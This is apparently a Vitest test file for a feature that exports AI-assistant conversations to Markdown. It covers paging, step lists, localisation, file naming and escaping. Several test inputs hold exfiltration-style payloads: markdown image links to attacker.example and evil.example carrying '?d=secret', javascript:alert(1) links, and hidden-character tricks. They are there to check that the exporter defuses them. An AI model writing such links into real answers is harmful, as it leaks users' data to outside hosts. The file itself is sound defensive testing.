import { beforeEach, describe, expect, test, vi } from "vitest";
import i18n from "@/i18n";
import type { AssistantClient, StoredMessage } from "../assistant-client";
import {
  conversationMarkdown,
  ExportTooLong,
  exportFileName,
  turnsOf,
  wholeHistory,
  type ExportDocument,
} from "../conversation-export";

const prompt = (turn: string, text: string, createdAt = "2026-11-26T09:00:00Z"): StoredMessage => ({
  id: `${turn}:1`,
  turnId: turn,
  role: "user",
  text,
  createdAt,
});
const answer = (
  turn: string,
  text: string,
  fields: Partial<StoredMessage> = {},
): StoredMessage => ({
  id: `${turn}:2`,
  turnId: turn,
  role: "assistant",
  text,
  createdAt: "2026-11-26T09:00:30Z",
  ...fields,
});
const history = (steps: NonNullable<StoredMessage["history"]>["steps"], fields = {}) => ({
  steps,
  stepsOmitted: 0,
  runs: [],
  usage: null,
  ...fields,
});
const step = (id: string, tool: string, args: Record<string, unknown>, fields = {}) => ({
  id,
  tool,
  arguments: args,
  startedAt: null,
  endedAt: null,
  status: "completed" as const,
  resultExcerpt: "",
  resultTruncated: false,
  refusal: "",
  ...fields,
});

const markdown = (messages: StoredMessage[], fields: Partial<ExportDocument> = {}) =>
  conversationMarkdown(
    {
      title: "Why is web down",
      collector: "collector.example.com",
      messages,
      exportedAt: new Date("2026-11-26T10:00:00Z"),
      timeZone: "UTC",
      ...fields,
    },
    i18n.t,
    i18n,
  );

describe("the export of a conversation", () => {
  beforeEach(async () => {
    await i18n.changeLanguage("en");
  });

  test("reads the whole history, the oldest page first", async () => {
    const getMessages = vi
      .fn<AssistantClient["getMessages"]>()
      .mockResolvedValueOnce({ messages: [prompt("t3", "third")], nextCursor: "3:1" })
      .mockResolvedValueOnce({ messages: [prompt("t2", "second")], nextCursor: "2:1" })
      .mockResolvedValueOnce({ messages: [prompt("t1", "first")], nextCursor: "" });
    const signal = new AbortController().signal;
    const messages = await wholeHistory({ getMessages } as unknown as AssistantClient, "c1", {
      signal,
    });
    expect(messages.map((message) => message.text)).toEqual(["first", "second", "third"]);
    expect(getMessages.mock.calls.map(([id, options]) => [id, options?.before])).toEqual([
      ["c1", ""],
      ["c1", "3:1"],
      ["c1", "2:1"],
    ]);
  });

  test("gives up on a history too long, rather than read without end", async () => {
    const getMessages = vi
      .fn<AssistantClient["getMessages"]>()
      .mockResolvedValue({ messages: [prompt("t1", "again")], nextCursor: "1:1" });
    await expect(
      wholeHistory({ getMessages } as unknown as AssistantClient, "c1"),
    ).rejects.toBeInstanceOf(ExportTooLong);
    expect(getMessages).toHaveBeenCalledTimes(64);
  });

  test("joins the assistant messages of a turn, the steps and the model of the last", () => {
    const turns = turnsOf([
      prompt("t1", "Why?"),
      answer("t1", "First part.", { id: "t1:2" }),
      answer("t1", "Second part.", { id: "t1:4", modelId: "haiku", history: history([]) }),
    ]);
    expect(turns).toHaveLength(1);
    expect(turns[0]?.answer).toMatchObject({
      text: "First part.\n\nSecond part.",
      modelId: "haiku",
    });
  });

  test("writes the title, the collector, the prompts, the answers and their steps", () => {
    const text = markdown([
      prompt("t1", "Why is the alert on par-dev-app02?"),
      answer("t1", "The **fs#1** resource failed.\n\n```sh\nom par-dev-app02 logs\n```", {
        modelId: "claude-haiku",
        history: history(
          [
            step("c1", "load_skill", { skill: "morning-check" }),
            step("c2", "list_alerts", {}, { status: "failed" }),
            step("c3", "acknowledge_alert", { id: "1" }, { status: "rejected" }),
          ],
          { stepsOmitted: 2, runs: [{ startedAt: 1000, endedAt: 13000 }] },
        ),
      }),
    ]);
    expect(text).toBe(
      [
        "# Why is web down",
        "",
        "Collector: collector.example.com · Exported on Nov 26, 2026, 10:00 AM · Times in UTC",
        "",
        "---",
        "",
        "### You · Nov 26, 2026, 9:00 AM",
        "",
        "```",
        "Why is the alert on par-dev-app02?",
        "```",
        "",
        "### Assistant · Nov 26, 2026, 9:00 AM · 12 s",
        "",
        "> The \\*\\*fs#1\\*\\* resource failed.",
        ">",
        "> ```sh",
        "> om par-dev-app02 logs",
        "> ```",
        "",
        "**Steps**",
        "",
        "- Load the procedure “morning-check”",
        "- List alerts (refused by the tool)",
        "- Acknowledge alert (rejected by you)",
        "- 2 steps not kept in the history",
        "",
        "_Model: claude-haiku_",
        "",
        "---",
        "",
        "_The answers stopped or failed are not stored, nor exported._",
        "",
      ].join("\n"),
    );
  });

  test("names the call as it ran, with the changes of the user", () => {
    const text = markdown([
      prompt("t1", "Load it"),
      answer("t1", "Loaded.", {
        history: history([
          step(
            "c1",
            "load_skill",
            { skill: "morning-check" },
            { editedArgs: { skill: "evening-check" } },
          ),
        ]),
      }),
    ]);
    expect(text).toContain("- Load the procedure “evening-check” (with your changes)\n");
    expect(text).not.toContain("morning-check");
  });

  test("writes a prompt as the transcript shows it, in a block none of its lines closes", () => {
    const text = markdown([
      prompt("t1", "\nWhy?\n[DEFAULT]\n\n\n# orchestrate = ha\n<id> *.log ```x``` ````\n  "),
    ]);
    expect(text).toContain(
      [
        "`````",
        "Why?",
        "[DEFAULT]",
        "",
        "",
        "# orchestrate = ha",
        "<id> *.log ```x``` ````",
        "`````",
      ].join("\n"),
    );
  });

  test("quotes an answer, its code blocks fenced again as written, one left open closed", () => {
    const text = markdown([
      prompt("t1", "Show"),
      answer(
        "t1",
        "```ini\n[a]\n\n\n[b]\n<img src=x> ![i](https://x)\n```\nThen:\n~~~\nopen ```` block\n### You · fake",
      ),
      prompt("t2", "Next"),
    ]);
    expect(text).toContain(
      [
        "> ```ini",
        "> [a]",
        ">",
        ">",
        "> [b]",
        "> <img src=x> ![i](https://x)",
        "> ```",
        "> Then:",
        "> `````",
        "> open ```` block",
        "> ### You · fake",
        "> `````",
        "",
      ].join("\n"),
    );
    // The next turn is the document's, out of the quote.
    expect(text).toContain("\n---\n\n### You · Nov 26, 2026, 9:00 AM\n\n```\nNext\n```\n");
  });

  // Out of its code blocks, an answer holds no markup but escaped: whatever the
  // model wrote, nothing loads, links or passes for html where the file is read.
  // An exclamation mark alone makes no image, its bracket escaped.
  const unescapedMarkup = (text: string) => {
    const quoted = text.split("\n").filter((line) => line.startsWith(">"));
    const prose: string[] = [];
    let fence: string | null = null;
    for (const line of quoted.map((item) => item.replace(/^> ?/, ""))) {
      const marker = /^(`{3,})/.exec(line)?.[1];
      if (fence !== null) {
        if (line === fence) fence = null;
      } else if (marker !== undefined) {
        fence = marker;
      } else {
        prose.push(line);
      }
    }
    return prose.filter((line) =>
      /(^|[^\\])(\\\\)*[[\]<>`*_~|]/.test(line.replace(/\\[\s\S]/g, "")),
    );
  };

  test.each([
    "See ![chart](https://attacker.example/?d=secret) and <img src=https://attacker.example> <!-- x -->.",
    "[Runbook](https://docs.example/run) [creds](https://u:p@attacker.example) [js](javascript:alert(1))",
    '[note]: see ![p](https://evil.example/z.png?d=secret) and <img src="https://evil.example/y.png"> and <javascript:alert(1)>',
    "\\`![x](https://evil.example/leak?d=secret)`",
    "a ` b\nc ` ![x](https://evil.example/m.png) ` d",
    "text\n    ```\n![x](https://evil.example/a)\n\nmore <b>bold</b>",
    "- item\n  ```\n  code\n![x](https://evil.example/b)",
    "- [a]: javascript:alert(1)\n\n[a]:\njavascript:alert(1)\n\n[click][a]",
  ])("loads nothing and leads nowhere from an answer: %s", (written) => {
    const text = markdown([prompt("t1", "Check"), answer("t1", written)]);
    expect(unescapedMarkup(text)).toEqual([]);
  });

  test("writes the paths of the collector an answer links as its addresses", () => {
    const text = markdown([prompt("t1", "Where?"), answer("t1", "See [the node](/nodes/n1).")], {
      origin: "https://collector.example.com",
    });
    expect(text).toContain("> See \\[the node\\](https://collector.example.com/nodes/n1).");
  });

  test("keeps the names of the steps and of the collector from making links, emphasis or hidden text", () => {
    const text = markdown(
      [
        prompt("t1", "Check"),
        answer("t1", "Done.", {
          history: history([
            step("c1", "load_skill", { skill: "[x](https://evil.example)*b*~~s~~\u202egpj" }),
          ]),
        }),
      ],
      { collector: "<img src=x> {{name}}\u200b", title: "# _title_\nnext" },
    );
    // A # past the one of the heading is its text.
    expect(text.split("\n")[0]).toBe("# # \\_title\\_ next");
    expect(text).toContain("Collector: \\<img src=x\\> {{name}} · ");
    expect(text).toContain(
      "- Load the procedure “\\[x\\](https://evil.example)\\*b\\*\\~\\~s\\~\\~gpj”\n",
    );
  });

  test("names an untitled conversation, and writes the dates in the language and the zone of the user", async () => {
    await i18n.changeLanguage("fr");
    const text = markdown([prompt("t1", "Bonjour"), answer("t1", "Bonjour.")], {
      title: "  ",
      timeZone: "Europe/Paris",
    });
    expect(text.split("\n")[0]).toBe(`# ${i18n.t("assistant.untitled")}`);
    expect(text).toContain("Exportée le 26 nov. 2026, 11:00 · Heures en Europe/Paris");
    expect(text).toContain("### Vous · 26 nov. 2026, 10:00");
  });

  test("names the file after the title, without accents, and the day", () => {
    const day = new Date(2026, 10, 26, 10, 0);
    expect(exportFileName("Pourquoi par-dev-app02 est arrêté ?", day)).toBe(
      "pourquoi-par-dev-app02-est-arrete-2026-11-26.md",
    );
    expect(exportFileName("Cœur de cluster, Straße", day)).toBe(
      "coeur-de-cluster-strasse-2026-11-26.md",
    );
    expect(exportFileName("   ", day)).toBe("conversation-2026-11-26.md");
    expect(exportFileName("a".repeat(59) + " b", day, "")).toBe(`${"a".repeat(59)}-2026-11-26`);
  });
});
